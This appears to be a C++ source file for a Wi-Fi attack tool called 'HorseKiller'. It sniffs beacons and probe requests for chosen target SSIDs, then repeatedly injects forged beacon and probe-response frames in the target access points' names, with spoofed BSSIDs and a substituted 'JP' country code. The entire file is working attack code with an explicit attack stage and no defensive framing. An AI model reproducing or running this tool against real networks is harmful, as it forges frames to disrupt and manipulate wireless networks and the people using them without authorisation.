#include <cassert>
#include <chrono>
#include <fstream>
#include <iostream>
#include <map>
#include <memory>
#include <mutex>
#include <string>
#include <thread>
#include <tins/tins.h>
#include <unistd.h>

#include <AccessPointManager.hpp>
#include <RegionConfiguration.hpp>

extern "C"
{
#include <80211Wrapper.h>
}

using namespace Tins;
using namespace std;

// include/net/ieee80211_radiotap.h

enum ieee80211_radiotap_tx_flags
{
    IEEE80211_RADIOTAP_F_TX_FAIL = 0x0001,
    IEEE80211_RADIOTAP_F_TX_CTS = 0x0002,
    IEEE80211_RADIOTAP_F_TX_RTS = 0x0004,
    IEEE80211_RADIOTAP_F_TX_NOACK = 0x0008,
    IEEE80211_RADIOTAP_F_TX_NOSEQNO = 0x0010,
    IEEE80211_RADIOTAP_F_TX_ORDER = 0x0020,
};

void injectPacket(PDU *pdu, bool drop_fcs, pcap_t *handle)
{
    auto pkt = pdu->serialize();

    if (pcap_inject(handle, &pkt[0], pkt.size() - (drop_fcs ? 4 : 0)) == -1)
    {
        std::cerr << "Error injecting packet... [ " << pcap_geterr(handle) << " ]" << std::endl;
    }
}

RadioTap constructBeaconFrameWithDifferentRegion(Dot11Beacon *pBeacon, int channel)
{
    Dot11Beacon mgnt;

    mgnt.addr1(pBeacon->addr1());
    mgnt.addr2(pBeacon->addr2());
    mgnt.addr3(pBeacon->addr3());

    auto &&cap = mgnt.capabilities();
    cap = pBeacon->capabilities();

    for (auto option : pBeacon->options())
    {
        if (option.option() == Dot11ManagementFrame::OptionTypes::COUNTRY)
        {
            if (pBeacon->ds_parameter_set() <= 14) // 2GHz
            {
                mgnt.country({"JP ", {1}, {14}, {20}});
            }
            else // 5GHz
            {
                mgnt.country({"JP ", {36}, {4}, {20}});
            }
        }
        else
            mgnt.add_option(option);
    }

    RadioTap radio = RadioTap() / mgnt; // make 802.11 packet

    radio.channel(ieee80211_channel_to_frequency(channel, channel <= 14 ? NL80211_BAND_2GHZ : NL80211_BAND_5GHZ),
                  channel <= 14 ? RadioTap::ChannelType::TWO_GZ : RadioTap::ChannelType::FIVE_GZ);

    radio.tx_flags(IEEE80211_RADIOTAP_F_TX_NOACK);

    return radio;
}

RadioTap constructProbeResponseFrameWithDifferentRegion(Dot11Beacon *pBeacon, int channel)
{
    Dot11ProbeResponse mgnt;

    mgnt.addr1(Dot11::BROADCAST);
    mgnt.addr2(pBeacon->addr2());
    mgnt.addr3(pBeacon->addr3());

    auto &&cap = mgnt.capabilities();
    cap = pBeacon->capabilities();

    for (auto option : pBeacon->options())
    {
        if (option.option() == Dot11ManagementFrame::OptionTypes::COUNTRY)
        {
            if (pBeacon->ds_parameter_set() <= 14) // 2GHz
            {
                mgnt.country({"JP ", {1}, {14}, {20}});
            }
            else // 5GHz
            {
                mgnt.country({"JP ", {36}, {4}, {20}});
            }
        }
        else
            mgnt.add_option(option);
    }

    RadioTap radio = RadioTap() / mgnt; // make 802.11 packet

    radio.channel(ieee80211_channel_to_frequency(channel, channel <= 14 ? NL80211_BAND_2GHZ : NL80211_BAND_5GHZ),
                  channel <= 14 ? RadioTap::ChannelType::TWO_GZ : RadioTap::ChannelType::FIVE_GZ);

    radio.tx_flags(IEEE80211_RADIOTAP_F_TX_NOACK);

    return radio;
}

class HorseKiller
{

    bool sniffing;
    bool running;

    int round = 0;
    int now_channel = 0;

    const RegionConfiguration &config;
    AccessPointManager apm;

    std::map<int, int> channel_ap_num;

    std::thread sniff_loop, packet_sender_loop;
    PacketSender sender;

    std::map<HWAddress<6>, std::string> bssids;
    std::mutex bssids_lock;

    std::optional<Sniffer> psniffer;

public:
    HorseKiller(const RegionConfiguration &config)
        : sniffing(false), running(false), config(config), apm(config)
    {
    }

    void inject_loop()
    {
        for (; running; round++)
        {
            auto channel_aps = apm.getAPs();

            if (round >= config.scan_round)
            {
                channel_aps[1].size();
            }
            else
            {
                for (auto channel : config.channels)
                    channel_aps[channel].size();
            }

            std::vector<AccessPoint> all_aps;

            for (auto &[channel, aps] : channel_aps)
                for (auto ap : aps)
                    all_aps.push_back(ap);

            for (auto &[channel, aps] : channel_aps)
            {
                sniffing = true;

                now_channel = channel;

                std::cout << now_channel << std::endl;
                std::cout.flush();

                setChannel(config.device.c_str(), now_channel, "");

                auto prev_switch_time = std::chrono::high_resolution_clock::now();

                bool mark = true;

                while (mark)
                {
                    auto elapsed_time = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::high_resolution_clock::now() - prev_switch_time);

                    if (sniffing && elapsed_time > std::chrono::milliseconds(config.scan_stage_channel_time))
                    {
                        sniffing = false;
                    }
                    if (elapsed_time > std::chrono::milliseconds(config.attack_stage_channel_time))
                    {
                        mark = false;
                        break;
                    }

                    for (auto ap : all_aps)
                    {
                        auto elapsed_time = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::high_resolution_clock::now() - prev_switch_time);

                        if (sniffing && elapsed_time > std::chrono::milliseconds(config.scan_stage_channel_time))
                        {
                            sniffing = false;
                        }

                        if (elapsed_time > std::chrono::milliseconds(config.attack_stage_channel_time))
                        {
                            mark = false;
                            break;
                        }

                        if (ap.beacon)
                        {
                            auto radio = constructBeaconFrameWithDifferentRegion(
                                ap.beacon.get(),
                                channel);

                            injectPacket(&radio, config.drop_fcs, psniffer->get_pcap_handle());
                        }
                    }
                }
            }
        }
    }

    bool loop_func()
    {

        for (; running;)
        {
            while (sniffing)
            {
                auto pkt = psniffer->next_packet();

                auto &pdu = *pkt.pdu();

                if (Dot11Beacon *beacon = pdu.find_pdu<Dot11Beacon>())
                {
                    std::string ssid = beacon->ssid();
                    bool have = false;

                    // TODO
                    for (auto &s : config.target_ssids)
                    {
                        if (s == ssid)
                        {
                            have = true;
                            break;
                        }
                    }

                    if (have)
                    {
                        std::string country = "00 ";

                        try
                        {
                            country = beacon->country().country;
                        }
                        catch (...)
                        {
                        }

                        if (country != "JP ")
                        {
                            try
                            {
                                auto bssid = beacon->addr2();

                                auto tap = pdu.find_pdu<RadioTap>();
                                auto signal_dbm = (signed)tap->dbm_signal();
                                auto channel = ieee80211_frequency_to_channel((signed)tap->channel_freq());
                                auto essid = beacon->ssid();

                                if (channel == (int)beacon->ds_parameter_set())
                                    apm.update(bssid, essid, channel, signal_dbm);
                                apm.addBeacon(beacon);
                            }
                            catch (field_not_present e)
                            {
                            }
                        }
                    }
                }

                if (Dot11ProbeRequest *request = pdu.find_pdu<Dot11ProbeRequest>())
                {
                    std::string ssid = request->ssid();
                    bool have = false;

                    // TODO
                    for (auto &s : config.target_ssids)
                    {
                        if (s == ssid)
                        {
                            have = true;
                            break;
                        }
                    }

                    auto tap = pdu.find_pdu<RadioTap>();
                    auto channel = ieee80211_frequency_to_channel((signed)tap->channel_freq());

                    auto ap = apm.getApByESSID(ssid, channel <= 14 ? 2 : 5);

                    if (ap.beacon)
                    {
                        auto &beacon = *(ap.beacon);
                        auto addr = beacon.addr2();

                        for (int i = 0; i < 4; i++)
                        {
                            addr[5] = addr[5] * 61 + 19;

                            Dot11ProbeResponse response;

                            response.addr1(Dot11::BROADCAST);
                            response.addr2(addr);
                            response.addr3(response.addr2());

                            for (auto option : beacon.options())
                            {
                                if (option.option() == Dot11ManagementFrame::OptionTypes::COUNTRY)
                                {
                                    if (beacon.ds_parameter_set() <= 14) // 2GHz
                                    {
                                        response.country({"JP ", {1}, {14}, {20}});
                                    }
                                    else // 5GHz
                                    {
                                        response.country({"JP ", {36}, {4}, {20}});
                                    }
                                }
                                else
                                    response.add_option(option);
                            }

                            RadioTap radio = RadioTap() / response;
                            radio.tx_flags(IEEE80211_RADIOTAP_F_TX_NOACK);

                            injectPacket(&radio, config.drop_fcs, psniffer->get_pcap_handle());
                        }
                    }
                }

                delete pkt.pdu();
            }

            std::this_thread::sleep_for(std::chrono::milliseconds(10));
        }

        return true;
    }

    void start()
    {
        running = true;

        SnifferConfiguration conf;
        conf.set_immediate_mode(true);
        // conf.set_rfmon(true);
        psniffer = Sniffer(config.device, conf);

        packet_sender_loop = std::thread([this]() -> void {
            inject_loop();
        });

        sniff_loop = std::thread([this]() -> void { loop_func(); });
    }

    void join()
    {
        if (sniff_loop.joinable())
            sniff_loop.join();

        if (packet_sender_loop.joinable())
            packet_sender_loop.join();
    }
};

int main(int argc, char *argv[])
{
    if (argc != 2)
    {
        cout << "Usage: " << argv[0] << " <configuration>" << endl;
        return -1;
    }

    std::string yaml_filename = argv[1];

    YAML::Node configYAML = YAML::LoadFile(yaml_filename);

    RegionConfiguration config = configYAML.as<RegionConfiguration>();

    HorseKiller killer(config);

    killer.start();

    killer.join();
}
